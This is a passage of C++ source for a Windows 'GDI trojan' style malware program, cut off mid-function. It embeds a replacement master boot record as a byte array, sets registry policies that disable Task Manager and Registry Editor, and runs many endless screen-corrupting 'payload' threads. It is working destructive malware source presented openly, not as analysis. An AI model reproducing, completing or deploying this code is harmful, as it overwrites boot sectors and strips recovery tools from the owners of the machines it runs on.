#include <Windows.h>
#pragma comment(lib, "winmm.lib")
#include <math.h>
#include <time.h>
#define M_PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

LPCWSTR  generateRandomUnicodeString(int len)
{
	wchar_t* ustr = new wchar_t[len + 1];      // +1 for '\0'

	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}
const unsigned char MasterBootRecord[] = { 0xb8, 0x13, 0x00, 0xcd, 0x10, 0xb8, 0x00, 0xa0, 0x8e, 0xd8, 0x8e, 0xc0,
  0xfc, 0x31, 0xc9, 0x51, 0xe5, 0x40, 0x50, 0xb4, 0x18, 0x50, 0x50, 0xb1,
  0x04, 0x51, 0x51, 0x89, 0xe5, 0xbb, 0x00, 0xff, 0x88, 0xd8, 0x04, 0x11,
  0x3c, 0x22, 0x72, 0x06, 0x24, 0x0e, 0xb0, 0x00, 0x75, 0x02, 0xb0, 0x80,
  0x88, 0x07, 0x43, 0x75, 0xeb, 0xb1, 0x0c, 0x88, 0x4e, 0x0b, 0xbf, 0x22,
  0xff, 0xb2, 0x0c, 0xe8, 0x7a, 0x01, 0xc6, 0x01, 0x80, 0xe8, 0x74, 0x01,
  0xc6, 0x01, 0xc0, 0x83, 0xc7, 0x10, 0xe2, 0xef, 0xe8, 0x7c, 0x01, 0x80,
  0xe2, 0x1f, 0x75, 0x54, 0xe8, 0x0e, 0x01, 0xe8, 0x43, 0x01, 0x89, 0xd9,
  0xb3, 0x00, 0x80, 0x3f, 0xc0, 0x72, 0x42, 0x39, 0xcb, 0x75, 0x11, 0xc6,
  0x04, 0x0c, 0x83, 0xc6, 0x17, 0x74, 0x99, 0x73, 0xf6, 0x56, 0xe8, 0x56,
  0x01, 0x5e, 0xeb, 0xef, 0x89, 0xdf, 0x88, 0xd8, 0x88, 0xcc, 0xba, 0x0f,
  0x0f, 0x21, 0xc2, 0x31, 0xd0, 0x38, 0xc4, 0x74, 0x08, 0x8d, 0x7f, 0x10,
  0x73, 0x03, 0x8d, 0x7f, 0xf0, 0x38, 0xd6, 0x74, 0x05, 0x4f, 0x72, 0x02,
  0x47, 0x47, 0x80, 0x3d, 0x00, 0x75, 0x06, 0x8a, 0x07, 0xc6, 0x07, 0x00,
  0xaa, 0x43, 0x75, 0xb6, 0xbf, 0x27, 0x00, 0x8d, 0x45, 0xec, 0x03, 0x46,
  0x02, 0xe8, 0xb1, 0x00, 0xe8, 0xd5, 0x00, 0x73, 0xfb, 0xb9, 0x04, 0x12,
  0x74, 0x1f, 0xb5, 0x20, 0x83, 0xff, 0x14, 0x75, 0x18, 0x80, 0x7e, 0x0a,
  0x01, 0x74, 0x12, 0xe8, 0xcf, 0x00, 0xfe, 0x07, 0x80, 0x3f, 0xc3, 0x75,
  0x08, 0xc6, 0x07, 0x00, 0xfe, 0x4e, 0x0b, 0x74, 0x90, 0x8d, 0x45, 0x0c,
  0xe8, 0x8f, 0x00, 0xf7, 0xe6, 0x88, 0xe3, 0x88, 0xd7, 0x43, 0xb8, 0x00,
  0x08, 0x99, 0xf7, 0xf3, 0x3d, 0xc6, 0x00, 0x72, 0x03, 0xb8, 0xc6, 0x00,
  0x89, 0xc6, 0xd3, 0xe8, 0x00, 0xe8, 0x93, 0x57, 0x49, 0xd3, 0xe7, 0xb8,
  0xc8, 0x00, 0x29, 0xf0, 0xd1, 0xe8, 0x50, 0x56, 0x91, 0x8a, 0x46, 0x0a,
  0xe8, 0x98, 0x00, 0x93, 0x59, 0xe8, 0x93, 0x00, 0xb0, 0x03, 0x59, 0xe8,
  0x8d, 0x00, 0x5f, 0x4f, 0x79, 0x89, 0xb4, 0x02, 0xcd, 0x16, 0x8b, 0x5e,
  0x02, 0xa8, 0x04, 0x74, 0x02, 0x4b, 0x4b, 0xa8, 0x08, 0x74, 0x02, 0x43,
  0x43, 0xb4, 0x01, 0xa8, 0x01, 0x74, 0x07, 0xf6, 0xc7, 0x01, 0x75, 0x02,
  0xb4, 0x07, 0x88, 0x66, 0x0a, 0x88, 0xc7, 0x89, 0x5e, 0x02, 0xa8, 0x02,
  0x74, 0x14, 0x93, 0xe8, 0x13, 0x00, 0xe8, 0x37, 0x00, 0x72, 0x0b, 0x83,
  0xfe, 0x04, 0x75, 0xf6, 0x89, 0x56, 0x06, 0x89, 0x5e, 0x04, 0xe9, 0xe7,
  0xfe, 0x31, 0xf6, 0x8b, 0x56, 0x06, 0x50, 0xe8, 0x04, 0x00, 0x91, 0x58,
  0x04, 0x20, 0xa8, 0x40, 0x9c, 0xa8, 0x20, 0x74, 0x02, 0x34, 0x1f, 0x83,
  0xe0, 0x1f, 0xbb, 0xdc, 0x7d, 0x2e, 0xd7, 0x9d, 0x74, 0x02, 0xf7, 0xd8,
  0x8b, 0x5e, 0x04, 0xc3, 0x46, 0x01, 0xca, 0x01, 0xc3, 0x53, 0x51, 0xe8,
  0x07, 0x00, 0x8a, 0x1f, 0xd0, 0xe3, 0x59, 0x5b, 0xc3, 0x88, 0xf3, 0xb1,
  0x04, 0xd2, 0xeb, 0x80, 0xe7, 0xf0, 0x08, 0xfb, 0xb7, 0xff, 0xc3, 0x88,
  0xc4, 0xab, 0xab, 0xab, 0xab, 0x81, 0xc7, 0x38, 0x01, 0xe2, 0xf6, 0xc3,
  0xb0, 0xfb, 0xf6, 0x66, 0x08, 0x04, 0x53, 0x88, 0x46, 0x08, 0xb4, 0x00,
  0xf6, 0xf2, 0x88, 0xe3, 0xb7, 0x00, 0xc3, 0xb4, 0x00, 0xcd, 0x1a, 0x3b,
  0x56, 0x00, 0x74, 0xf7, 0x89, 0x56, 0x00, 0xc3, 0x00, 0x09, 0x16, 0x24,
  0x31, 0x3e, 0x47, 0x53, 0x60, 0x6c, 0x78, 0x80, 0x8b, 0x96, 0xa1, 0xab,
  0xb5, 0xbb, 0xc4, 0xcc, 0xd4, 0xdb, 0xe0, 0xe6, 0xec, 0xf1, 0xf5, 0xf7,
  0xfa, 0xfd, 0xff, 0xff, 0x4f, 0x4f, 0x55, 0xaa
};

DWORD WINAPI Disable(LPVOID lpParam) {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
	return 0;
}
DWORD WINAPI payload1() {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			double fractalX = (2.f / w);
			double fractalY = (1.f / h);

			double cx = x * fractalX - 1.f;
			double cy = y * fractalY - 0.95f;

			double zx = 0;
			double zy = 0;

			int fx = 0;

			while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
			{
				double fczx = zx * zx - zy * zy + cx;
				double fczy = 2 * zx * zy + cy;

				zx = fczx;
				zy = fczy;
				fx++;

				if (i % h == 0 && rand() % 11)
					v = rand() % 20;
				((BYTE*)(data + i))[v * v] = fx;
			}

			//((BYTE*)(data + i))[v * v] = x & y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}
DWORD WINAPI payload2() {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 100;
		wPt[0].y = wRect.top - 100;
		wPt[1].x = wRect.right + 100;
		wPt[1].y = wRect.top - 0;
		wPt[2].x = wRect.left + 0;
		wPt[2].y = wRect.bottom + 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload3() {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 100;
		wPt[0].y = wRect.top - 100;
		wPt[1].x = wRect.right - 100;
		wPt[1].y = wRect.top - 0;
		wPt[2].x = wRect.left + 0;
		wPt[2].y = wRect.bottom + 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload4() {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			//rgbScreen[i].g = x + y >> i;
			double fractalX = (2.f / w);
			double fractalY = (0.90f / h);

			double cx = x * fractalX - 2.f;
			double cy = y * fractalY - 0.90f;

			double zx = 0;
			double zy = 0;

			int fx = 0;

			while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
			{
				double fczx = zx * zx - zy * zy + cx;
				double fczy = 2 * zx * zy + cy;

				zx = fczx;
				zy = fczy;
				fx++;


				rgbScreen[i].rgb += fx;
			}
			//rgbScreen[i].rgb += x * y ^ i;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
VOID WINAPI train(HDC hdc, int w, int h, int xPower, int yPower, DWORD dwRop) {
	if (xPower >= w) xPower = w - 1; if (yPower >= h) yPower = h - 1;
	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc2 = CreateCompatibleDC(hdc); rand() % 6;
	SelectObject(hdc2, screenshot);
	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	BitBlt(hdc, xPower > 0 ? xPower : 0, yPower > 0 ? yPower : 0, w - abs(xPower), h - abs(yPower), hdc, xPower < 0 ? -xPower : 0, yPower < 0 ? -yPower : 0, dwRop);
	BitBlt(hdc, xPower < 0 ? w + xPower : 0, 0, abs(xPower), h, hdc2, xPower > 0 ? w - xPower : 0, 0, dwRop);
	BitBlt(hdc, 0, yPower < 0 ? h + yPower : 0, w, abs(yPower), hdc2, 0, yPower > 0 ? h - yPower : 0, dwRop);
	DeleteDC(hdc2); DeleteObject(screenshot);
}
DWORD WINAPI payload5() { //credits to N17Pro3426, lol
	HDC hdcdc = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		hdcdc = GetDC(0);
		//SelectObject(desk, CreateSolidBrush(RGB(245, 245, 66)));
		for (int angle = 0; angle < 361; angle++) {
			int x = 100 * cos(angle * M_PI / 1.F), y = 999 * sin(angle * M_PI / 180.F);
			train(hdcdc, sw, sh, x, y, SRCERASE);
			Sleep(0.5);
		}
		ReleaseDC(0, hdcdc);
	}
}
DWORD WINAPI payload6() { //again credits to N17Pro3426
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int r = 2, g = 1, b = 4, power = 22;
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 3) {
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int v = 1 + rand() % 13;
			((BYTE*)(data + i))[r] = ((BYTE*)(data + i + v + power))[r] + 999.2;
			((BYTE*)(data + i))[g] = ((BYTE*)(data + i + v + power))[g] + 999.2;
			((BYTE*)(data + i))[b] = ((BYTE*)(data + i + v + power))[b] + 999.2;
		}
		SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
	}
}
DWORD WINAPI payload7() {
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		//int rrr = (rand () % 5 + 1)
		DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, IDC_HAND), (rand() % 99 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 99 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, IDC_UPARROW), (rand() % 99 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 99 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, IDC_SIZEALL), (rand() % 99 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 99 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, IDC_NO), (rand() % 99 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 99 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadCursor(0, IDC_HELP), (rand() % 99 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 99 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI phantasm() { //credits to N17Pro3426, also it's simular to Phantasm.exe by nikitpad :D, so this is my first attempt to made a circles like in Phantasm.exe lol
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), size = 100, radius = 227;
	//SeedXorshift32(__rdtsc());
	while (1) {
		hdc = GetDC(0);
		int origX1 = rand() % sw, origY1 = rand() % sh;
		int origX2 = -20 + rand() % (sw + 20), origY2 = -20 + rand() % (sh + 20);
		int origX3 = -30 + rand() % (sw + 30), origY3 = -30 + rand() % (sh + 30);
		int origX4 = -20 + rand() % (sw + 20), origY4 = -20 + rand() % (sh + 20);
		int origX5 = rand() % sw, origY5 = rand() % sh;
		for (int angle = 0; angle < 1081; angle += 12.1) {
			InvalidateRect(0, 0, 0);
			int x1 = radius * cos(angle * M_PI / 180.0) + origX1, y1 = radius * sin(angle * M_PI / 180.0) + origY1;
			int x2 = radius * cos(angle * M_PI / 180.0) + origX2, y2 = radius * sin(angle * M_PI / 180.0) + origY2;
			int x3 = radius * cos(angle * M_PI / 180.0) + origX3, y3 = radius * sin(angle * M_PI / 180.0) + origY3;
			int x4 = radius * cos(angle * M_PI / 180.0) + origX4, y4 = radius * sin(angle * M_PI / 180.0) + origY4;
			int x5 = radius * cos(angle * M_PI / 180.0) + origX5, y5 = radius * sin(angle * M_PI / 180.0) + origY5;
			if (angle < 720) size += 20; if (angle > 720) size -= 39;
			HRGN circle1 = CreateEllipticRgn(x1, y1, x1 - size, y1 - size);
			HRGN circle2 = CreateEllipticRgn(x2, y2, x2 - size, y2 - size);
			HRGN circle3 = CreateEllipticRgn(x3, y3, x3 - size, y3 - size);
			HRGN circle4 = CreateEllipticRgn(x4, y4, x4 - size, y4 - size);
			HRGN circle5 = CreateEllipticRgn(x5, y5, x5 - size, y5 - size);
			InvertRgn(hdc, circle1); InvertRgn(hdc, circle2); InvertRgn(hdc, circle3); InvertRgn(hdc, circle4); InvertRgn(hdc, circle5);
			Sleep(26.4);
		}
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI payload9() { //credits to ArcTic (JhoPro)
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int rgb = MAXDWORD64, v = 0, radius = 99.4f; double angle = 0;
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 6) {
		//if (!i) for (int c = 0; c < 21; c++)InvalidateRect(0, 0, 0);
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int x = i % w, y = i / h;
			if (i % h == 0 && rand() % 100 == 0)  v = 1 + rand() % 6;
			rgb ^= (int)data + (x ^ y);
			((BYTE*)(data + i))[v] = rgb;
		}
		float x = cos(angle) * radius, y = sin(angle) * radius;
		BitBlt(hdc, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
		//Sleep(39.7);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}
COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}
DWORD WINAPI payload10() {
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);

	while (true)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 8);
		HBRUSH brush = CreateSolidBrush(RndRGB());
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, y, sw, h, hdc, rand() % 999 - 999, y, SRCCOPY);
		PatBlt(hdc, -1, y, sw, h, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		//Sleep(rand() % 1234);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI payload11() {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * log(x * y | i * x));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 100.f + y / screenHeight * 1.9999f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload12()  //credits to fr4ctalz for the base
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(x + y | i & x));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 100.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload13() {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 90;
		wPt[0].y = wRect.top - 90;
		wPt[1].x = wRect.right + 50;
		wPt[1].y = wRect.top - 0;
		wPt[2].x = wRect.left + 0;
		wPt[2].y = wRect.bottom + 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload14() {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 90;
		wPt[0].y = wRect.top - 90;
		wPt[1].x = wRect.right + 50;
		wPt[1].y = wRect.top - 0;
		wPt[2].x = wRect.left + 0;
		wPt[2].y = wRect.bottom + 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload15() {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 90;
		wPt[0].y = wRect.top - 90;
		wPt[1].x = wRect.right - 50;
		wPt[1].y = wRect.top - 0;
		wPt[2].x = wRect.left + 0;
		wPt[2].y = wRect.bottom + 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload16() {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 90;
		wPt[0].y = wRect.top - 90;
		wPt[1].x = wRect.right - 50;
		wPt[1].y = wRect.top - 0;
		wPt[2].x = wRect.left + 0;
		wPt[2].y = wRect.bottom + 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload17() {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 90;
		wPt[0].y = wRect.top + 90;
		wPt[1].x = wRect.right - 50;
		wPt[1].y = wRect.top - 0;
		wPt[2].x = wRect.left + 0;
		wPt[2].y = wRect.bottom + 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload18() {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 10;
		wPt[0].y = wRect.top + 10;
		wPt[1].x = wRect.right - 50;
		wPt[1].y = wRect.top - 0;
		wPt[2].x = wRect.left + 0;
		wPt[2].y = wRect.bottom + 0;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	}
}
DWORD WINAPI payload19() {
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 10;
		wPt[0].y = wRect.top - 10;
		wPt[1].x = wRect.right + 50;
		wPt[1].y = wRect.top - 0;
		wPt[2].x = wRect.left + 0;
		wPt[2].y = wRect.bottom + 0;
